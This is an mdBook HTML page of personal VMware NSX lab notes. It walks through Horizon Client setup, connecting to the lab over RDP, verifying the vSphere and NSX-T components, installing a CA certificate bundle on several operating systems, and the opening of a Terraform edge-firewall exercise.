<!DOCTYPE HTML>
<html lang="ko" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>khyoon&#x27;s VMware Note</title>
        
        <meta name="robots" content="noindex" />
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="favicon.svg">
        
        
        <link rel="shortcut icon" href="favicon.png">
        
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        
        <link rel="stylesheet" href="css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="vmware.html"><strong aria-hidden="true">1.</strong> VMware</a></li><li class="chapter-item expanded "><a href="vsphere/index.html"><strong aria-hidden="true">2.</strong> vSphere</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vsphere/vcenter/index.html"><strong aria-hidden="true">2.1.</strong> vCenter</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vsphere/vcenter/installation.html"><strong aria-hidden="true">2.1.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vsphere/esxi/index.html"><strong aria-hidden="true">2.2.</strong> ESXi</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vsphere/esxi/installation.html"><strong aria-hidden="true">2.2.1.</strong> Installation</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="vcn/index.html"><strong aria-hidden="true">3.</strong> VCN (Virtual Cloud Network)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/livefire/index.html"><strong aria-hidden="true">3.1.</strong> VCN Livefie 1.0</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/livefire/kicking-things-off.html"><strong aria-hidden="true">3.1.1.</strong> Kicking Things Off</a></li><li class="chapter-item expanded "><a href="vcn/livefire/horizon-client-invalid-ssl-certificate.html"><strong aria-hidden="true">3.1.2.</strong> Horizon Client: Invalid SSL Certificate?</a></li><li class="chapter-item expanded "><a href="vcn/livefire/uctilise-terraform-to-apply-edge-firewall-rules.html"><strong aria-hidden="true">3.1.3.</strong> Utilise Terraform To Apply Edge Firewall Rules</a></li><li class="chapter-item expanded "><a href="vcn/livefire/enable-nsx-intrusion-prevention-system.html"><strong aria-hidden="true">3.1.4.</strong> Enable NSX Intrusion Prevention System (IDS)</a></li><li class="chapter-item expanded "><a href="vcn/livefire/perform-multi-stage-attack-leveraging-software-vulnerabilities.html"><strong aria-hidden="true">3.1.5.</strong> Perform Multi-Stage Attack Leveraging Software Vulnerabilities</a></li><li class="chapter-item expanded "><a href="vcn/livefire/use-nsx-ips-to-stop-attacks-to-vulnerable-applications.html"><strong aria-hidden="true">3.1.6.</strong> Use NSX IPS to Stop Attacks to Vulnerable Applications</a></li><li class="chapter-item expanded "><a href="vcn/livefire/protect-vdi-via-nsx-micro-segmentation.html"><strong aria-hidden="true">3.1.7.</strong> Protect VDI via NSX Micro-Segmentation</a></li><li class="chapter-item expanded "><a href="vcn/livefire/lab-introduction-and-overview.html"><strong aria-hidden="true">3.1.8.</strong> Lab Introduction and Overview</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-t-cloud-preparations.html"><strong aria-hidden="true">3.1.9.</strong> NSX-T Cloud Preparations</a></li><li class="chapter-item expanded "><a href="vcn/livefire/setup-nsx-t-cloud.html"><strong aria-hidden="true">3.1.10.</strong> Setup NSX-T Cloud</a></li><li class="chapter-item expanded "><a href="vcn/livefire/replace-existing-load-balancer.html"><strong aria-hidden="true">3.1.11.</strong> Replace existing Load Balancer</a></li><li class="chapter-item expanded "><a href="vcn/livefire/optional-service-optimization-and-operations.html"><strong aria-hidden="true">3.1.12.</strong> Optional: Service Optimization and Operations</a></li><li class="chapter-item expanded "><a href="vcn/livefire/lab-introduction.html"><strong aria-hidden="true">3.1.13.</strong> Lab Introduction</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-advanced-load-balancer-cloud-preparation.html"><strong aria-hidden="true">3.1.14.</strong> NSX Advanced Load Balancer Cloud preparation</a></li><li class="chapter-item expanded "><a href="vcn/livefire/avi-kubernetes-operator-for-tkg.html"><strong aria-hidden="true">3.1.15.</strong> Avi Kubernetes Operator for TKG</a></li><li class="chapter-item expanded "><a href="vcn/livefire/tkg-workload-l4-load-balancing.html"><strong aria-hidden="true">3.1.16.</strong> TKG Workload L4 load Balancing</a></li><li class="chapter-item expanded "><a href="vcn/livefire/tkg-workload-l7-load-balancing.html"><strong aria-hidden="true">3.1.17.</strong> TKG Workload L7 Load Balancing</a></li><li class="chapter-item expanded "><a href="vcn/livefire/tkg-workload-security-with-antrea-networkPolicy.html"><strong aria-hidden="true">3.1.18.</strong> TKG Workload Security with Antrea NetworkPolicy</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-cloud-environment-overview.html"><strong aria-hidden="true">3.1.19.</strong> NSX Cloud Environment Overview</a></li><li class="chapter-item expanded "><a href="vcn/livefire/validate-csm-registration-with-nsx-manager.html"><strong aria-hidden="true">3.1.20.</strong> Validate CSM Registration with NSX Manager</a></li><li class="chapter-item expanded "><a href="vcn/livefire/enable-csm-to-access-your-aws-inventory.html"><strong aria-hidden="true">3.1.21.</strong> Enable CSM to access your AWS inventory</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-enforced-mode-prepare-workloads.html"><strong aria-hidden="true">3.1.22.</strong> NSX Enforced Mode - Prepare workloads in Self-Managed/Transit AWS VPC</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-enforced-mode-deploy-nsx-pcg.html"><strong aria-hidden="true">3.1.23.</strong> NSX Enforced Mode - Deploy NSX PCG in a Self-Managed/Transit VPC</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-enforced-mode-onboard-workload-vms.html"><strong aria-hidden="true">3.1.24.</strong> NSX-Enforced Mode - Onboard Workload VMs</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-enforced-mode-connect-on-premise-dc-with-aws-vpc-leveraging-ipsec-vpn.html"><strong aria-hidden="true">3.1.25.</strong> NSX Enforced mode - Connect on-premise DC with AWS VPC leveraging IPSEC VPN</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-enforced-mode-setup-micro-segmentation-for-workloads.html"><strong aria-hidden="true">3.1.26.</strong> NSX Enforced Mode - Setup Micro-segmentation for workloads</a></li><li class="chapter-item expanded "><a href="vcn/livefire/onboarding-into-avi-load-balancer.html"><strong aria-hidden="true">3.1.27.</strong> Onboarding into AVI Load Balancer</a></li><li class="chapter-item expanded "><a href="vcn/livefire/nsx-enforced-mode-threat-detection-and-remediation-using-the-quarantine-policy.html"><strong aria-hidden="true">3.1.28.</strong> NSX Enforced Mode - Threat detection and remediation using the Quarantine policy</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/nsx/index.html"><strong aria-hidden="true">3.2.</strong> NSX Data Center</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/nsx/installation.html"><strong aria-hidden="true">3.2.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/sdwan/index.html"><strong aria-hidden="true">3.3.</strong> SD-WAN by VeloCloud</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/sdwan/installation.html"><strong aria-hidden="true">3.3.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/nsx-alb/index.html"><strong aria-hidden="true">3.4.</strong> NSX Adv Load Balancer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/nsx-alb/installation.html"><strong aria-hidden="true">3.4.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/nsx-fw/index.html"><strong aria-hidden="true">3.5.</strong> NSX Service-defined Firewall</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/nsx-fw/installation.html"><strong aria-hidden="true">3.5.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/nsx-cloud/index.html"><strong aria-hidden="true">3.6.</strong> NSX Cloud</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/nsx-cloud/installation.html"><strong aria-hidden="true">3.6.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/nsx-int/index.html"><strong aria-hidden="true">3.7.</strong> NSX Intelligence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/nsx-int/installation.html"><strong aria-hidden="true">3.7.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/vrni/index.html"><strong aria-hidden="true">3.8.</strong> vRealize Network Insight</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/vrni/installation.html"><strong aria-hidden="true">3.8.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/nsx-sm/index.html"><strong aria-hidden="true">3.9.</strong> NSX Service Mesh</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/nsx-sm/installation.html"><strong aria-hidden="true">3.9.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/nsx-ids/index.html"><strong aria-hidden="true">3.10.</strong> NSX Distributed IDS/IPS</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/nsx-ids/installation.html"><strong aria-hidden="true">3.10.1.</strong> Installation</a></li></ol></li><li class="chapter-item expanded "><a href="vcn/hcx/index.html"><strong aria-hidden="true">3.11.</strong> HCX</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="vcn/hcx/installation.html"><strong aria-hidden="true">3.11.1.</strong> Installation</a></li><li class="spacer"></li></ol></li></ol></li><li class="chapter-item expanded "><a href="about.html">about</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">khyoon&#x27;s VMware Note</h1>

                    <div class="right-buttons">
                        
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                        

                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="vmware"><a class="header" href="#vmware">VMware</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="vsphere"><a class="header" href="#vsphere">vSphere</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="vcenter"><a class="header" href="#vcenter">vCenter</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation"><a class="header" href="#installation">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="esxi"><a class="header" href="#esxi">ESXi</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-1"><a class="header" href="#installation-1">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="vcn"><a class="header" href="#vcn">VCN</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="vcn-livefie-10"><a class="header" href="#vcn-livefie-10">VCN Livefie 1.0</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="01-kicking-things-off"><a class="header" href="#01-kicking-things-off">0.1 Kicking Things Off!</a></h1>
<p>In this section we will walk you through how you access the lab and verify the working of the infrastructure components. It is recommended to have Horizon Client installed on your Mac or PC, but it is also possible to use the Horizon web interface. You will use the VDI Desktop as a jump host to RDP to the Main Console inside your dedicated lab environment.</p>
<p>The instructor will provide the Horizon credentials and the lab RDP IP via Slack.</p>
<h2 id="1-download-and-install-the-horizon-client"><a class="header" href="#1-download-and-install-the-horizon-client">1. Download and install the Horizon Client</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/291/medium/07e595a9-2de1-449b-8119-97026ed0dc59.png" alt="" /></p>
<p>Open the Browser on your laptop</p>
<ol>
<li>Navigate to URL <a href="https://desktop.livefire.dev/">https://desktop.livefire.dev/</a></li>
<li>Click On <strong>Install VMware Horizon Client</strong> that will direct to the full list of VMware Horizon Clients for various OS</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/293/medium/f37a265b-d7fb-4480-a4ce-313842718ee8.png" alt="" /></p>
<ol>
<li>Click on <strong>Go to Downloads</strong> for either Windows or Mac</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/295/medium/6fd68a34-32e7-45fa-91d9-b6fea9fe4838.png" alt="" /></p>
<ol>
<li>Click <strong>DOWNLOAD NOW</strong> to download the client for the respective OS (In my case I choose Mac based Client).</li>
</ol>
<p>Install Horizon Client (Follow the installation wizard to complete the installation as you do for any other application installation ).</p>
<blockquote>
<p>MacOS Client Security Settings: -- note that &quot;Allow connection via an SSL Proxy&quot; must be checked if &quot;Never connect to untrusted servers&quot; OR &quot;Warn before connecting to untrusted servers&quot; is selected.</p>
<p>If &quot;Do not verify server identity certificates&quot; is selected, then the box does <strong>not</strong> need to be checked.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/298/488/original/a27e41dc-4241-42d9-9983-eb970e8e1c92.png" alt="" /></p>
<blockquote>
<p>Windows Client Security Settings: </p>
<p>-- note that &quot;Allow connection via an SSL Proxy&quot; must be checked if &quot;Never connect to untrusted servers&quot; OR &quot;Warn before connecting to untrusted servers&quot; is selected.</p>
<p>If &quot;Do not verify server identity certificates&quot; is selected, then the box does <strong>not</strong> need to be checked.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/298/490/original/198565e0-52b3-443f-8f76-42a01048820c.png" alt="" /></p>
<h2 id="2-connect-to-connection-server"><a class="header" href="#2-connect-to-connection-server">2. Connect to connection server</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/245/original/20f6de71-5ea6-4f03-b5ff-3c3a513e0d32.png" alt="" /></p>
<p>Open Horizon Client</p>
<ol>
<li>Click <strong>+</strong> sign to add new server</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/247/original/dbafd054-6002-4787-9d36-32b0f1cf3870.png" alt="" /></p>
<ol>
<li>Enter <strong>desktop.livefire.dev</strong> as the name of Connection Server</li>
<li>Click <strong>Connect</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/297/original/df413322-2975-4db1-8240-5f5d1f44f0e5.png" alt="" /></p>
<ol>
<li>Enter Username <strong>nsxuserXXX@livefire.lab</strong> and Password <strong>XXXXX</strong> (Each student will be assigned unique credentials by the Instructor)</li>
<li>Click <strong>Login</strong></li>
</ol>
<blockquote>
<p>If you have SSL Certificate error when attempting to connect the client to desktop.livefire.dev, please see this article:</p>
<p><a href="https://nsx-labs.livefire.solutions/m/102496/l/1395680-horizon-client-invalid-ssl-certificate">Horizon Client: Invalid SSL Certificate?</a></p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/251/medium/65ca81b6-a1ec-4488-b543-9d11d12b18bf.png" alt="" /></p>
<ol>
<li>You should have access to the Jump Server as per the snapshot above</li>
</ol>
<h2 id="3-remote-desktop-to-the-control-center-to-access-the-lab-environment"><a class="header" href="#3-remote-desktop-to-the-control-center-to-access-the-lab-environment">3. Remote Desktop to the Control Center to access the LAB environment</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/253/original/007e5e2d-3fe2-4a0a-b0dd-0e6a0bb88895.png" alt="" /></p>
<ol>
<li>Right Click On <strong>NSXRDP.rdp</strong> shortcut on the desktop</li>
<li>Click <strong>Edit</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/299/original/11c5d76c-61bd-4ae8-8f1e-15ba364e1eb6.png" alt="" /></p>
<ol>
<li>Under Computer Field fill in with <strong>IP Address</strong> provided to you by the Instructor. I my case it is 172.25.4.28</li>
<li>Click <strong>Connect</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/301/original/76e6985e-7ff2-4a34-9eb0-e760c2e02575.png" alt="" /></p>
<ol>
<li>Click <strong>Connect</strong> again to accept the warning</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/303/original/bfe747aa-9095-4b2d-a6e8-6ba1342432f0.png" alt="" /></p>
<ol>
<li>Enter <strong>VMware1!</strong> as password</li>
<li>Click <strong>OK</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/305/original/5968980a-dda4-4587-ac4e-4ae6c806a7fb.png" alt="" /></p>
<ol>
<li>Click <strong>Yes</strong> to ignore Certificate errors</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/426/117/original/60f4dc95-289a-4d67-85d9-bd474d5b8156.png" alt="" /></p>
<p>Your RDP session will open in fullscreen mode:</p>
<ol>
<li>Verify that Lab Status shows <strong>Ready</strong></li>
</ol>
<h2 id="4-verify-login-and-vsphere-infrastructure"><a class="header" href="#4-verify-login-and-vsphere-infrastructure">4. Verify login and vSphere Infrastructure</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/265/original/74e78c6e-6ff8-45d3-a931-aa0a0360c0c3.png" alt="" /></p>
<ol>
<li>Open <strong>Chrome Browser</strong> icon from the taskbar of your desktop</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/267/medium/0768a503-cd83-47b8-b275-cdb44793f775.png" alt="" /></p>
<p>Default page directs you to vCenter vcsa-01a.corp.local</p>
<ol>
<li>Credentials will auto populate , hence click <strong>LOGIN</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/420/970/original/ad7e5a32-af48-4985-9077-878a486546d3.png" alt="" /></p>
<ol>
<li>Click <strong>VMs and Templates</strong> Icon</li>
<li>Expand <strong>SiteA</strong> Data Center under vcsa-01a.corp.local</li>
<li>Expand <strong>webapp, vulnapps and kubernetes</strong> </li>
<li>Verify following list of <strong>VMs are UP and running</strong> </li>
</ol>
<table><thead><tr><th align="left">Virtual Machines</th><th align="left">Description</th></tr></thead><tbody>
<tr><td align="left"><strong>app-01a</strong> <br/> <strong>db-01a</strong> <br/> <strong>web-01a</strong> <br/> <strong>web-02a</strong> <br/> <strong>lb-01a</strong></td><td align="left">3-Tier APP</td></tr>
<tr><td align="left"><strong>attacker-01a</strong></td><td align="left">VM for testing IDS/IPS</td></tr>
<tr><td align="left"><strong>tkg-mgmt x2</strong> <br/> <strong>tkg-service x 3</strong> <br/> <strong>tkg-workload x 3</strong></td><td align="left">Tanzu Kubernetes Grid Servers</td></tr>
<tr><td align="left"><strong>edge-01a</strong> <br/> <strong>edge-02a</strong></td><td align="left">NSX-T Edge Nodes VMs </td></tr>
<tr><td align="left"><strong>Couchdb-prd</strong> <br/> <strong>Couchdb-dev</strong> <br/> <strong>durpal-dev</strong></td><td align="left">Couchdb and drupal servers utilised for IDS/IPS testing</td></tr>
<tr><td align="left"><strong>win10-01a</strong></td><td align="left">Windows 10 VM utilised for VDI testing</td></tr>
<tr><td align="left"><strong>nsxcsm-01a</strong></td><td align="left">Cloud Service Manager utilised for NSX Cloud integration</td></tr>
<tr><td align="left"><strong>unbuntu-utils</strong></td><td align="left">VM will be used for automating deployments of the objects and configuration via Ansible and Python</td></tr>
</tbody></table>
<h2 id="5-verify-status-of-the-nsx-t-manager"><a class="header" href="#5-verify-status-of-the-nsx-t-manager">5. Verify status of the NSX-T Manager</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/281/original/4e7c5c6d-f179-4148-b41e-ccaf7ea59a89.png" alt="" /></p>
<ol>
<li>Open new TAB  inside Chrome browser and <strong>RegionA</strong> Bookmark folder</li>
<li>Click <strong>NSX Manager GUI</strong> bookmark</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/218/283/original/0cd28073-13d0-404d-b423-e1a1a2c0cf58.png" alt="" /></p>
<p>Credentials will auto populate</p>
<ol>
<li>Click <strong>LOG IN</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/426/119/medium/385ec4f1-d409-4ea4-8a52-df0ae7defffe.png" alt="" /></p>
<p>Your screen should look like shown above. Make sure that the <strong>POLICY</strong> view is activated.</p>
<h2 id="6-conclusion"><a class="header" href="#6-conclusion">6. Conclusion</a></h2>
<p>By following the above steps you verified your LAB components and their status. Components' status in your LAB environment should reflect as per snapshots above. If you find any discrepancy reach out to the Instructors</p>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="horizon-client-invalid-ssl-certificate"><a class="header" href="#horizon-client-invalid-ssl-certificate">Horizon Client: Invalid SSL Certificate?</a></h1>
<h2 id="horizon-client-says-invalid-ssl-certificate"><a class="header" href="#horizon-client-says-invalid-ssl-certificate">Horizon Client Says Invalid SSL Certificate</a></h2>
<blockquote>
<p>The Load Balancers in front of our Horizon UAGs are using Wildcard SSL Certificates issued by Sectigo (formerly &quot;COMODO&quot;). While web browsers seem to trust this CA server, the user's OS may not and the Horizon client appears to rely on what the OS trusts.</p>
</blockquote>
<blockquote>
<p>You ONLY need to follow the steps below for your relevant Operating System if your Horizon Client complains about the SSL Certificate. If your Horizon Client connected without issue, you may skip this article.</p>
</blockquote>
<p>The CA Certificate bundle has been placed on our blog for easy access: <a href="https://livefire.solutions/ca-bundle.crt">https://livefire.solutions/ca-bundle.crt</a></p>
<h3 id="which-operating-system"><a class="header" href="#which-operating-system">Which Operating System?</a></h3>
<h3 id="macos"><a class="header" href="#macos">MacOS</a></h3>
<ol>
<li>Download the <a href="https://livefire.solutions/ca-bundle.crt">ca-bundle.crt</a> file from our blog</li>
<li>Double-click the pem file - MacOS should open the <strong>Keychain Access</strong> application</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/296/525/original/529d2091-b729-42f9-a2d5-394371209853.png" alt="" /></p>
<ol>
<li>Locate the &quot;<em><strong>Sectigo RSA Domain Validation Secure Server CA</strong></em>&quot; entry in your list of Certificates and <strong>double-click</strong> it</li>
<li>The certificate should show as valid</li>
<li>(Optionally) Change the &quot;When using this certificate&quot; dropdown to <strong>Always Trust</strong></li>
</ol>
<p>After re-launching the Horizon Client with the Preferences set as:</p>
<ul>
<li>Never connect to untrusted servers</li>
<li>Allow connection via an SSL Proxy</li>
</ul>
<p>The client should no longer complain of an invalid SSL Certificate</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/296/565/original/0e326a8a-1d5e-47d1-a7fb-cc698a2b9886.png" alt="" /></p>
<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
<ul>
<li>Download the <a href="https://livefire.solutions/ca-bundle.crt">ca-bundle.crt</a> file from our blog</li>
<li>Double-click the .crt file to open it</li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/296/812/original/61a264dd-0a83-4c3c-9b4c-084d8459988d.png" alt="" /></p>
<ul>
<li>Click the <strong>Install Certificate</strong> button</li>
<li>When prompted, select <strong>Local Machine</strong> for the Store Location and click <strong>Next</strong></li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/296/814/original/ce301c77-4be6-41d6-88e7-6561cd59a997.png" alt="" /></p>
<ol>
<li>Select <strong>Place all certificates in the following store</strong></li>
<li>Click <strong>Browse</strong></li>
<li>Select <strong>Trusted Root Certificate Authorities</strong></li>
<li>Click <strong>OK</strong></li>
<li>Click <strong>Next</strong>, then click <strong>Finish</strong></li>
</ol>
<p>Click <strong>OK</strong> on the confirmation window, then <strong>OK</strong> to close the Certificate details window</p>
<p>After re-launching the Horizon with the Preferences set as:</p>
<ul>
<li>Never connect to untrusted servers</li>
<li>Allow connection via an SSL Proxy</li>
</ul>
<p>The client should no longer complain of an invalid SSL Certificate</p>
<h3 id="ubuntu"><a class="header" href="#ubuntu">Ubuntu</a></h3>
<p>From a console, run the following commands from the folder with the file:</p>
<pre><code>curl https://livefire.solutions/ca-bundle.crt -o ca-bundle.crt
sudo cp ca-bundle.crt /usr/local/share/ca-certificates
sudo update-ca-certificates
</code></pre>
<p>The following commands have been validated on Ubuntu 20.04 Desktop</p>
<p>After re-launching the Horizon Client for Linux with the Preferences set as:</p>
<ul>
<li>Never connect to untrusted servers</li>
<li>Allow connection via an SSL Proxy</li>
</ul>
<p>The client should no longer complain of an invalid SSL Certificate</p>
<h3 id="manjaro-arch-linux"><a class="header" href="#manjaro-arch-linux">Manjaro (Arch) Linux</a></h3>
<p>From a console, run the following commands from the folder with the file:</p>
<pre><code>curl https://livefire.solutions/ca-bundle.crt -o ca-bundle.crt
sudo trust anchor --store ca-bundle.crt
sudo update-ca-trust
</code></pre>
<p>After re-launching the Horizon Client for Linux with the Preferences set as:</p>
<ul>
<li>Never connect to untrusted servers</li>
<li>Allow connection via an SSL Proxy</li>
</ul>
<p>The client should no longer complain of an invalid SSL Certificate</p>
<p>Congratulations, you are done!</p>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="11-utilise-terraform-to-apply-edge-firewall-rules"><a class="header" href="#11-utilise-terraform-to-apply-edge-firewall-rules">1.1 Utilise Terraform To Apply Edge Firewall Rules</a></h1>
<h2 id="1-overview"><a class="header" href="#1-overview">1. Overview</a></h2>
<p>Your customer believes that one of their applications has been compromised, and are looking for you to implement some edge security using day-2 automation techniques. This will allow them to replicate the configuration for other applications in the future. </p>
<p>To facilitate the implementation of zone level segmentation, the network team deployed a T1 Gateway dedicated to each security zone. In this way, the zone-specific rules can be applied to the appropriate T1 Gateway, making the rule sets easier. Granular edge firewall rules allow the internet facing drupal web server to communicate only to the internal zone's development database. In this way, if an attacker compromises the drupal dev server, they will not directly pivot to the production database where critical data is stored. We will perform the majority edge firewall configuration via Terraform, to segment the DMZ and internal zone via the edge firewall, and we will then apply some modifications via the UI. We will verify our work via the NSX built-in traceflow tool.</p>
